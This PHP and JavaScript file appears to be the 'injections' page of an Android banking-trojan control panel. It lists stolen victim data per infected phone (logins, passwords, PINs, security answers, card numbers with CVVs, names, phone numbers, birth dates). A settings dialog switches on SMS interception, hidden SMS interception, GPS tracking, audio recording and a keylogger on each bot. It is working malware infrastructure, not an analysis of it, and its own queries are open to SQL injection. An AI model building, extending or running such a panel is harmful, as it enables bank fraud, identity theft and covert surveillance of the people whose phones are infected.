<?php
$statusCode=false;
if (!(isset($_SESSION['panel_user'])))
{
	session_destroy();
	header("Location: /login.php");
}else{

	if ($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /login.php");
	}

	if (($_SESSION['panel_right']!="admin")&&($_SESSION['panel_right']!="user")){
		header("Location: /index.php");
	}else{
		$statusCode=true;
	}
}
if($statusCode){
?>
<div id="showAlert"></div>
<script>
function getTextFileLogs(imei){
	$.ajax({
      url: 'application/get/logBot.php?imei='+imei,
      success: function(data) {
         $('#textArea').append('<textarea id="logsTextArea" readonly name="mesage"  wrap="virtual" class="textlog">'+data+'</textarea>');
      }
});
refreshContentTable();
}
	function getSettingsBot(imei){
		$("#text_imei_set").val(imei);
			$('#comboBox_imeis2').append($('<option>', {
							value: '0',
							text: imei
						}));
				// ------ Clear Form -------
				var inputsClear = document.getElementsByTagName("input");
				for (var i = 0; i < inputsClear.length; i++) {
					if (inputsClear[i].type == "checkbox" && inputsClear[i].id == 'check_set') {
						inputsClear[i].checked = false ;
					}
				}
				document.getElementById("chkinterceptSMS").checked = false;
				document.getElementById("chkhideSMS").checked = false;
				document.getElementById("chknetwork").checked = false;
				document.getElementById("chkgps").checked = false;
				document.getElementById("check_foreground").checked = false;
				document.getElementById("check_keylogger").checked = false;
				document.getElementById("check_record").checked = false;
				document.getElementById("id_seconds").value = '';

				$.ajax({url: 'application/get/settingsBot.php?imei='+imei,   success: function(data) {
				     var arrayData = data.split('|');
					 var seconds = arrayData[0];
					 var injections = arrayData[1].split('/');
					 var interceptSMS = arrayData[2];
					 var hideSMS = arrayData[3];
					 var network = arrayData[4];
					 var gps =  arrayData[5];
					 var status =  arrayData[6];
					 var foreground = arrayData[7];
					 var keylogger = arrayData[8];
					 var check_record = arrayData[9];
					 var text_seconds = arrayData[10];

					if(status!=null){
						 if(status==1){
							document.getElementById("AstatusSettings").style.color='red';
							document.getElementById("statusSettings").innerHTML="Settings are not active, wait until the bot updates them..";
						 }else{
							document.getElementById("AstatusSettings").style.color='#00FF00';
							document.getElementById("statusSettings").innerHTML="Settings are active!";
						 }
					}

				   if(seconds!=null){
						document.getElementById("idSeconds").innerHTML=seconds;
				   }

				    var inputs = document.getElementsByTagName("input");
					for(var j = 1; j < injections.length; j++){
						for (var i = 0; i < inputs.length; i++) {
							if (inputs[i].type == "checkbox" && inputs[i].id == 'check_set' && inputs[i].value == injections[j]) {
								inputs[i].checked = true ;
							}
						}
					}

					if(interceptSMS==1){
						  document.getElementById("chkinterceptSMS").checked = true;
					}
					if(hideSMS==1){
						 document.getElementById("chkhideSMS").checked = true;
					}
					if(network==1){
						document.getElementById("chknetwork").checked = true;
					}
					if(gps==1){
						document.getElementById("chkgps").checked = true;
					}
					if(foreground==1){
						document.getElementById("check_foreground").checked = true;
					}
					if(keylogger==1){
						document.getElementById("check_keylogger").checked = true;
					}
					if(check_record==1){
						document.getElementById("check_record").checked = true;
					}

					if(text_seconds!=null){
						document.getElementById("id_seconds").value = text_seconds;
					}



			}});
	}

	function saveSetting(){
		var getImeis = document.getElementById("text_imei_set").value;

		var injections = '';
		var inputs = document.getElementsByTagName("input");
		for (var i = 0; i < inputs.length; i++) {
			if (inputs[i].type == "checkbox" && inputs[i].id == 'check_set' && inputs[i].checked == true) {
				injections = injections + '/' + inputs[i].value;
			}
		}
		var chkinterceptSMS = 0;
		if(document.getElementById("chkinterceptSMS").checked==true){
			chkinterceptSMS = 1;
		}

		var chkhideSMS = 0;
		if(document.getElementById("chkhideSMS").checked==true){
			chkhideSMS = 1;
		}

		var chknetwork = 0;
		if(document.getElementById("chknetwork").checked==true){
			chknetwork = 1;
		}

		var chkgps = 0;
		if(document.getElementById("chkgps").checked==true){
			chkgps = 1;
		}

		var foreground = 0;
		if(document.getElementById("check_foreground").checked==true){
			foreground = 1;
		}

		var keylogger = 0;
		if(document.getElementById("check_keylogger").checked==true){
			keylogger = 1;
		}

		var check_record = 0;
		if(document.getElementById("check_record").checked==true){
			check_record = 1;
		}

		var text_seconds = document.getElementById("id_seconds").value;


		$.ajax({ url: "application/set/settingsBots.php?text_imei_set="+ getImeis +"&check_set="+ injections +"&chknetwork="+chknetwork+"&chkgps="+chkgps+"&chkinterceptSMS="+chkinterceptSMS+"&chkhideSMS="+chkhideSMS+"&foreground="+foreground+"&keylogger="+keylogger+"&check_record="+check_record+"&text_seconds="+text_seconds,
			   cache: false});

		startNatif('success','Successfully saved settings!');
	}


</script>

<div class="content" style="padding-top:15px;">

<form name='findCC' method='post'>
<a style="margin-left: 35%;color: #EDB749;">
Data injections:
</a>

<?php
	$getFind = $_GET["find"];

	if(isset($_POST["find"]))//Открываем форму логи!
	{

		$find=$_POST["textfind"];

		header ("Location: /?cont=injections&find=$find");
	}

	echo "<input type='text' name='textfind' value='$getFind' id='styled-select' style='color: #EDB749; background: #1D1F24; width:15%;border: 1px solid black; border-color: rgba(255,255,255,.5); border-radius: 8px;'></input>";

?>




<input type='submit' value='FIND' name='find' style='margin-left:5px; width: 70px' class='btn btn-outline-secondary'/>
</form>


 <table class="table table-hover table_dark" id="bootstrap-table">
 <thead class="header_table_bots">
		<th><a title="Android"><img src="images/icons/table/Android.png" width='25px'/></a></th>
		<th><a title="Cards"><img src="images/icons/table/injection.png" width='23px'/></a></th>
		<th>Comments</th>
		<th><a title="Country"><img src="images/icons/table/icloud.png" width='25px'/></a></th>
	</thead>

<?php

		//include 'config.php';
		//include 'class_users_rights.php';
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');
		$sql = "SELECT * FROM injs";

	if(isset($_POST["click_log"]))//Открываем форму логи!
	{

			$log_IMEI = $_POST["click_log"];
					echo "<script>";
						echo "$(document).ready(function(){";
							echo "$('#log_modal').css({'display':'block'});";
						echo "});";
					echo "</script>";
	}

	if(isset($_POST["click_set"]))//Открываем форму настроек!
		{

			$set_IMEI = $_POST["click_set"];
					echo "<script>";
						echo "$(document).ready(function(){";
							echo "$('#set_modal').css({'display':'block'});";
						echo "});";
					echo "</script>";
		}


if (preg_match("/kom_save/",print_r($_POST,true)))
{
	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');

	$str = print_r($_POST,true);
	$str = str_replace("[kom_save","!!!",$str);
	$str = str_replace("]","@@@",$str);
	$massiv = explode("!!!", $str);
	$massiv = explode("@@@", $massiv[1]);
	$str = $massiv[0];

	$comments = $_POST["komment$str"];
	$statement = $connection->prepare("UPDATE injs SET comments = '$comments' WHERE id = '$str';");
	$statement->execute([$comments]);
	$statement->execute([$str]);
}
if (preg_match("/delete/",print_r($_POST,true)))
{
	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');

	$str = print_r($_POST,true);
	$str = str_replace("[delete","!!!",$str);
	$str = str_replace("]","@@@",$str);
	$massiv = explode("!!!", $str);
	$massiv = explode("@@@", $massiv[1]);
	$str = $massiv[0];

	$statement = $connection->prepare("DELETE FROM injs WHERE id='$str'");
	$statement->execute([$str]);


}
		/****Ограничение по тегам****/
		$userRights = new users_right;
		$tags = explode("|", $userRights->getPrivateTags());
		$thisTag = explode(",", $tags[0]);
		$privateTag = explode(",", $tags[1]);
		/****************************/
	$sql = "SELECT * FROM injs";
	echo "<form name='formcards' method='post'>";
foreach($connection->query($sql) as $row)
	{
		$id = $row['id'];
		$idbot = $row['idbot'];
		$country = $row['country'];
		$name = $row['name'];
		$login = $row['login'];
		$password = $row['password'];
		$params1 = $row['params1'];
		$params2 = $row['params2'];
		$pin = $row['pin'];
		$vopros1 = $row['vopros1'];
		$vopros2 = $row['vopros2'];
		$otvet1 = $row['otvet1'];
		$otvet2 = $row['otvet2'];
		$cc = $row['cc'];
		$monthyear = $row['monthyear'];
		$cvv = $row['cvv'];
		$f_name = $row['f_name'];
		$l_name = $row['l_name'];
		$phone = $row['phone'];
		$dateBrith = $row['dateBrith'];
		$logs = $row['logs'];




		$comments = $row['comments'];


		$imei_="";
		$AndroidBot = "ID Bots: ";
		$AndroidOS = "Android: ";
		$Operator = "Operator: ";
		$country = "Country: ";
		$tag_ = "Tag: ";

		$connection2 = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection2->exec('SET NAMES utf8');
		$sql2 = "SELECT * FROM kliets";
		foreach($connection2->query($sql2) as $row2)
		{

			if($row2['IMEI'] == $idbot)
			{
				$OS = $row2['version'];
				$oper = $row2['number'];
				$countr = $row2['country'];
				$lastConnect = $row2['lastConnect'];
				$tag = $row2['version_apk'];
				$l_log = $row2['log'];
				$admin = $row2['r00t'];
				$screen =  $row2['screen'];
				$requestInjProc=$row2['requestInjProc'];
				$requestSMS=$row2['requestSMS'];

				//******Получаем иконку состояния бота, вычисляем дату****
				$arr_data_from = explode(" ", $row2['lastConnect']);
				$arr_data_till = explode(" ", date('Y-m-d H:i'));

				$date_from = $arr_data_from[0];
				$date_till = $arr_data_till[0];

				$date_from = explode('-', $date_from);
				$date_till = explode('-', $date_till);

				$time_from = mktime(0, 0, 0, $date_from[1], $date_from[2], $date_from[0]);
				$time_till = mktime(0, 0, 0, $date_till[1], $date_till[2], $date_till[0]);

				$day = ($time_till - $time_from)/60/60/24; //получаем разницу кол-во дней!
				//----------Секунды!-------/
				$date1 = new \DateTime($row2['lastConnect']);
				$date2 = new \DateTime(date('Y-m-d H:i'));
				$diff = $date2->diff($date1);
				// разница в секундах
				$seconds = ($diff->y * 365 * 24 * 60 * 60) + //получаем разницу в секундах!
				($diff->m * 30 * 24 * 60 * 60) +
				($diff->d * 24 * 60 * 60) +
				($diff->h * 60 * 60) +
				($diff->i * 60) +
				$diff->s;
				//----------обработка состояние иконки on/off-------/
				if($day>=2)//Дни!
				{
					$img="images/icons/kill.png";
					$getSortON_OFF="kill";
				}
				else
				{
					if($seconds<=120)
					{$img="images/icons/online.png";
					$getSortON_OFF="online";}
					else
					{$img="images/icons/offline.png";
					$getSortON_OFF="offline";}
				}
				//************Иконки ЛОГОВ***************************************

				if($l_log == "1")
				{$icon_log="images/icons/log_on.png";}
				elseif($l_log == "2")
				{$icon_log="images/icons/log_on_g.png";}
				else
				{$icon_log="images/icons/log_off.png";}


				if($admin == "1")
				{$icon_admin="images/icons/V.png";}
				else
				{$icon_admin="images/icons/X.png";}

				if($seconds<=120)
				{
					if($screen == "1")
					{$icon_screen="images/icons/V.png";}
					else
					{$icon_screen="images/icons/X.png";}
				}
				else
				{
					$icon_screen="images/icons/X.png";
				}

				if($requestInjProc == "1")
				{$icon_requestInjProc="images/icons/inj_v.png";}
				else
				{$icon_requestInjProc="images/icons/inj_off2.png";}

				if($requestSMS == "1")
				{$icon_requestSMS="images/icons/sms_v.png";}
				else
				{$icon_requestSMS="images/icons/sms_x.png";}
				//----страны

				if($countr == "") $countr = "not";

				$country =  mb_strtolower($countr);

				$imei_ = "$idbot";
				$AndroidBot = "ID Bots: $idbot";
				$AndroidOS = "Android: $OS";
				$Operator = "Operator: $oper";
				$tag_ = "Tag: $tag";
				break;
			}
		}

		if($_SESSION['panel_right']!="admin")//Ограничение по тегам
			{
				$boolContinue=true;
				if($tags[0]!=",")
				{
					foreach($thisTag as $tagZ)
					{
						if($tag == $tagZ)
						{
							if($tagZ!="")
							{
								$boolContinue=false;
								break;
							}
						}
					}
					if($boolContinue)continue;

				}
				else
				{
					foreach($privateTag as $tagZ)
					{
						if($tag == $tagZ)
						{
							if($tagZ!="")
							{
								$boolContinue=false;
								break;
							}
						}
					}
					if(!$boolContinue)continue;
				}
			}//---------------

		/*$vopros1 = $row['vopros1'];
		$vopros2 = $row['vopros2'];
		$otvet1 = $row['otvet1'];
		$otvet2 = $row['otvet2'];
		$cc = $row['cc'];
		$monthyear = $row['monthyear'];
		$cvv = $row['cvv'];



		$f_name = $row['f_name'];
		$l_name = $row['l_name'];
		$phone = $row['phone'];
		$dateBrith = $row['dateBrith'];
		$logs = $row['logs'];*/



		if($name!="")$name = "Name injection: $name</br>";
		if($login!="")$login = "Login: $login</br>";
		if($params1!="")$params1 = "Parameter 1: $params1</br>";
		if($params2!="")$params2 = "Parameter 2: $params2</br>";
		if($password!="")$password = "Password: $password</br>";
		if($pin!="")$pin = "Pin: $pin</br>";
		if($vopros1!="")$vopros1 = "Question 1: $vopros1</br>";
		if($otvet1!="")$otvet1 = "Response 1: $otvet1</br>";
		if($vopros2!="")$vopros2 = "Question 2: $vopros2</br>";
		if($otvet2!="")$otvet2 = "Response 2: $otvet2</br>";
		if($cc!="")$cc = "Number Card: $cc</br>";
		if($monthyear!="")$monthyear = "Month/Year: $monthyear</br>";
		if($cvv!="")$cvv = "CVV: $cvv</br>";

		if($f_name!="")$f_name = "First name: $f_name</br>";
		if($l_name!="")$l_name = "Last name: $l_name</br>";
		if($phone!="")$phone = "Phone number: $phone</br>";
		if($dateBrith!="")$dateBrith = "Date of birth: $dateBrith</br>";

		$logs=str_replace("//br//","</br>",$logs);


		$inj = "$name$login$params1$params2$password$pin$vopros1$otvet1$vopros2$otvet2$cc$monthyear$cvv$f_name$l_name$phone$dateBrith$logs";

		$infoBot = "$AndroidBot$AndroidOS$Operator$country$tag_";

		$boolFIND = true;
		$boolFIND3 = true;
		$boolFIND4 = true;
		if(($getFind==null)||($getFind=="")||($getFind==" ")){
			$boolFIND = true;
		}else{
			if(!Сontains($inj, $getFind)) {
				$boolFIND=false;
			}
			if(!Сontains($comments, $getFind)) {
				$boolFIND3=false;
			}
			if(!Сontains($infoBot, $getFind)) {
				$boolFIND4=false;
			}
		}

		if($country=="Country: ")$country="not";

		if(($boolFIND)||($boolFIND3)||($boolFIND4))
		{


			if($AndroidBot!="ID Bots: "){
				$icon="</br>
					<a title='$lastConnect'><img src=$img width='16px'/></a>
					<a title='Screen'><img src=$icon_screen width='18px'/></a>
					<a title='Hidden intercepting SMS'><img src=$icon_requestSMS width='18px'/></a>
					<a title='Permission injections'><img src=$icon_requestInjProc width='18px'/></a>
					<button class='btn_log' onclick='getTextFileLogs(\"$idbot\")' data-toggle='modal' data-target='.logs' style='background: transparent;' name='click_log' value='$idbot' title='Logs' ><img id='logs$idbot' src='$icon_log' title='Logs' alt='img' width='18px' class='img_log'/></button>
				    <button class='btn_log' onclick='getSettingsBot(\"$idbot\");'data-toggle='modal' data-target='.settings' style='background: transparent;' name='click_set' value='$idbot' title='Settings' ><img src='images/icons/fe.png' title='Settings' alt='img' width='20px' class='img_log'/></button>
		";
			}else{
				$icon="";
			}


			echo "<tr class='table_bots' style='color: #A4A4A4'>

			<td>

					<p align='left' style='color: #A4A4A4;'>
					$AndroidBot</br>
					$AndroidOS</br>
					$tag_</br>
					$Operator</br>
					Country: <a title='$country' style='margin-top: -4%;'><img src='images/country/$country.png' width='20px'/></a></br>

					$icon

			</p>
			</td>


			<td>
			<p align='left' style='color: #A4A4A4'>
			$inj

			</p>
			</td>

			<td>
			<textarea name='komment$id'  id='styled-select' style='color: #A4A4A4; background: transparent; height:100px; border: 1px solid #A4A4A4;'>$comments</textarea>
			</td>

			<td>
			<input type='submit' value='SAVE COMMENT' name='kom_save$id' style='margin-left:5px; border: 1px solid #000; width: 110px' class='btn btn-primary btn-xs'/>
			</br>
			<input type='submit' value='DELETE' name='delete$id' style='margin-left:5px; border: 1px solid #000; width: 110px;' class='btn btn-danger btn-xs'/>
			</td>


			</tr>";
		}
	}
	echo "</form>";
?>

</div>


<div class="modal fade logs" id = "log_modal"  style="margin-left:0px;">
	<div id = "modal_l">
	<a id="exit" data-dismiss="modal" aria-hidden="true" onclick="document.getElementById('logsTextArea').remove();" style="margin-left:97%; cursor: pointer; color: Red;">X</a>
		<div class="styled-select" id="textArea"></div>
	</div>
</div>



	<div  class="modal fade settings" style="Height: 572px; background: #1D1F24;	margin: 0px auto auto -250px;	padding: 10px;	border-radius: 5px;" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel" aria-hidden="true">
	<button type="button"  style="margin-top:-10px; color:#fff" class="close" data-dismiss="modal" aria-hidden="true">×</button>
		<div class="styled-select">

		<?php
		$connection4 = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection4->exec('SET NAMES utf8');
		$sql4 = "SELECT * FROM settings";


		echo "<center><a id='AstatusSettings'><h5 id='statusSettings'>Settings are not active, wait until the bot updates them..</h5></a></center>";

		echo "ID Bots<select name='comboBox_imeis2' id='comboBox_imeis2' style='color: #337ab7; background: #1D1F24; width: 100%; font-size: 13; height: 28px;    width: 100%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc;''>";

		echo "</select> ";
		echo "</br></br>";
		//-----------------------
		echo "<h5><a>Time of the bot:</a> <a style='color: Red;' id='idSeconds'></a> <a> seconds</a></h5>";
		echo "<a><h5>Injections</h5></a>";
		$sql4 = "SELECT * FROM injection";
		$countInject = 0;

		echo "<div style='width:100%; height:150px; background: #1D1F24; border: 1px solid #C1C1C1; overflow: auto;'>";
		foreach($connection4->query($sql4) as $row){
			$countInject++;
			$ID_inj = $row['id'];
			$name_inj = $row['name'];

			echo "<input type='checkbox' id='check_set' name='check_set[]' value='$ID_inj' style='margin-top: -10px;'>$name_inj</input></br>";
		}
		echo "</div>";

		echo "All injections: $countInject";
		echo "</br></br>";

		echo "<input type=checkbox name=check_record id='check_record' value='1' style='margin-top:0px;'> Record Sound </input>";
		echo "<input  type='text' name='id_seconds' id='id_seconds' style='color: #337ab7; background: #1D1F24; width: 10%; font-size: 13; height: 22px; padding: 5px; font-family: Consolas; border: 1px solid #ccc; border-radius: 8px'></input> Seconds";
		echo "</br>";
		echo "<input type=checkbox name=check_set_v id='chkinterceptSMS' value='1' style='margin-top:0px;'> Interception SMS</input>";
		echo "</br>";
		echo "<input type=checkbox name=check_set_d id='chkhideSMS' value='1' style='margin-top:0px;'> Hidden SMS interception</input>";
		echo "</br>";
		echo "<input type=checkbox name=check_set_network id='chknetwork' value='1' style='margin-top:0px;' > Geolocation NETWORK</input>";
		echo "</br>";
		echo "<input type=checkbox name=check_set_gps id='chkgps' value='1' style='margin-top:0px;'> Geolocation GPS</input>";
		echo "</br>";
		echo "<input type=checkbox name=check_foreground id='check_foreground' value='1' style='margin-top:0px;'> Foreground Service</input>";
		echo "</br>";
		echo "<input type=checkbox name=check_keylogger id='check_keylogger' value='1' style='margin-top:0px;'> Keylogger</input>";
		?>
		<input type='text' name='text_imei_set' id='text_imei_set'style='visibility:hidden'/>
		</br>
		<input type='submit' value='Save settings' onclick="saveSetting()" id="bth_add_set" name='bth_add_set'   class='btn btn-success' style='Width:100%; Height: 30px; font-size: 14; margin-top:20px;' data-dismiss="modal" aria-hidden="true"/>
	</div>

    </div>

<?php
}
 function Сontains($str,$substr)
 {
   $result = strpos($str, $substr);
   if ($result === FALSE) // если это действительно FALSE, а не ноль, например
     return false;
   else
     return true;
 }
?>
